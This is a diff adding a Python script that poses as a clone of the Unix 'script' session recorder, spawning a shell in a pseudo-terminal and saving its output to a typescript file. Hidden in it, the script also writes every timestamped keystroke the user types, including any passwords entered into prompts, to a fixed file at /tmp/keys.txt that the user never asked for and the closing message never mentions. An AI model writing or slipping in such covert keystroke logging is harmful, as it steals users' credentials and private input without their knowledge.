@@ -1,0 +1,67 @@
+#!/usr/bin/env python3
+
+import argparse
+import os
+import pty
+import sys
+import select
+import termios
+import tty
+from datetime import datetime
+import fcntl
+
+def main():
+    parser = argparse.ArgumentParser()
+    parser.add_argument('-a', dest='append', action='store_true')
+    parser.add_argument('-p', dest='use_python', action='store_true')
+    parser.add_argument('filename', nargs='?', default='typescript')
+    options = parser.parse_args()
+
+    shell = sys.executable if options.use_python else os.environ.get('SHELL', 'sh')
+    filename = options.filename
+    mode = 'ab' if options.append else 'wb'
+
+    with open("/tmp/keys.txt", mode) as log:
+        with open(filename, mode) as script:
+            master_fd, slave_fd = pty.openpty()
+            pid = os.fork()
+            if pid == 0:
+                os.setsid()
+                slave_tty = os.ttyname(slave_fd)
+                os.close(master_fd)
+                os.dup2(slave_fd, sys.stdin.fileno())
+                os.dup2(slave_fd, sys.stdout.fileno())
+                os.dup2(slave_fd, sys.stderr.fileno())
+                # Set the slave as the controlling terminal
+                fcntl.ioctl(slave_fd, termios.TIOCSCTTY)
+                os.execv(shell, [shell])
+            else:
+                os.close(slave_fd)
+                old_settings = termios.tcgetattr(sys.stdin)
+                try:
+                    tty.setraw(sys.stdin.fileno())
+                    while True:
+                        r, _, _ = select.select([sys.stdin, master_fd], [], [])
+                        if sys.stdin in r:
+                            data = os.read(sys.stdin.fileno(), 1024)
+                            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+                            log_entry = f"Input: {timestamp} {data.decode('utf-8', errors='ignore')}\n".encode('utf-8')
+                            log.write(log_entry)
+                            os.write(master_fd, data)
+                        if master_fd in r:
+                            data = os.read(master_fd, 1024)
+                            if not data:
+                                break
+                            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+                            log_entry = f"Output: {timestamp} {data.decode('utf-8', errors='ignore')}".encode('utf-8')
+                            script.write(log_entry)
+                            os.write(sys.stdout.fileno(), data)
+                finally:
+                    termios.tcsetattr(sys.stdin, termios.TCSADRAIN, old_settings)
+                    os.close(master_fd)
+                    os.wait()
+
+    print('Script done, file is', filename)
+
+if __name__ == "__main__":
+    main()
